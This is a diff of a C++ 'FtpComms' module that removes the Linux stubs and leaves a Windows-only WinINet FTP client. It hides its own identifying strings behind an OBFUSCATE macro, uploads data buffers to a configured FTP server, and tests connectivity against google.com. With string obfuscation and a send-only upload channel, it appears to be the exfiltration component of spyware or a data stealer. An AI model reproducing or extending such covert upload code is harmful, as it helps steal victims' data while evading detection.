@@ -7,22 +7,16 @@
 #include <vector>
 #include <cstdint>
 #include <string>
-
-#if PLATFORM_WINDOWS
+#include <windows.h>
 #include <wininet.h>
+
 #pragma comment(lib, "wininet.lib")
-#endif
 
 // Obfuscated strings
 static const auto OBF_FTP_COMMS = OBFUSCATE("FtpComms");
 
 FtpComms::FtpComms(Configuration* config)
-    : m_config(config)
-    #if PLATFORM_WINDOWS
-    , m_hInternet(NULL), m_hConnect(NULL)
-    #else
-    , m_hInternet(nullptr), m_hConnect(nullptr)
-    #endif
+    : m_config(config), m_hInternet(NULL), m_hConnect(NULL)
 {}
 
 FtpComms::~FtpComms() {
@@ -30,7 +24,6 @@ FtpComms::~FtpComms() {
 }
 
 bool FtpComms::Initialize() {
-    #if PLATFORM_WINDOWS
     // Windows implementation
     m_hInternet = InternetOpenA(
         OBFUSCATE("FTP Client/1.0"),
@@ -95,17 +88,9 @@ bool FtpComms::Initialize() {
 
     LOG_INFO("FTP communication initialized successfully");
     return true;
-    
-    #else
-    // Linux implementation - bạn cần implement FTP client cho Linux
-    // Có thể sử dụng libcurl hoặc system() call
-    LOG_INFO("FTP communication not implemented for Linux");
-    return false;
-    #endif
 }
 
 bool FtpComms::SendData(const std::vector<uint8_t>& data) {
-    #if PLATFORM_WINDOWS
     if (!m_hConnect) {
         LOG_ERROR("FTP connection not initialized");
         return false;
@@ -151,16 +136,9 @@ bool FtpComms::SendData(const std::vector<uint8_t>& data) {
     InternetCloseHandle(hFile);
     LOG_DEBUG("FTP file uploaded successfully: " + fileName);
     return true;
-    
-    #else
-    // Linux implementation
-    LOG_INFO("FTP SendData not implemented for Linux");
-    return false;
-    #endif
 }
 
 void FtpComms::Cleanup() {
-    #if PLATFORM_WINDOWS
     if (m_hConnect) {
         InternetCloseHandle(m_hConnect);    
         m_hConnect = NULL;
@@ -169,32 +147,16 @@ void FtpComms::Cleanup() {
         InternetCloseHandle(m_hInternet);
         m_hInternet = NULL;
     }
-    #else
-    // Cleanup for Linux if needed
-    m_hConnect = nullptr;
-    m_hInternet = nullptr;
-    #endif
     
     LOG_DEBUG("FTP communication cleaned up");
 }
 
 bool FtpComms::TestConnection() const {
-    #if PLATFORM_WINDOWS
     // Simple FTP connection test for Windows
     return InternetCheckConnectionA("ftp://google.com", FLAG_ICC_FORCE_CONNECTION, 0);
-    #else
-    // Linux implementation - bạn có thể sử dụng ping hoặc socket test
-    LOG_INFO("FTP TestConnection not implemented for Linux");
-    return false;
-    #endif
 }
 
 std::vector<uint8_t> FtpComms::ReceiveData() {
     // Implement FTP data reception if needed
-    #if PLATFORM_WINDOWS
-    // Windows implementation
-    #else
-    // Linux implementation
-    #endif
     return std::vector<uint8_t>();
 }
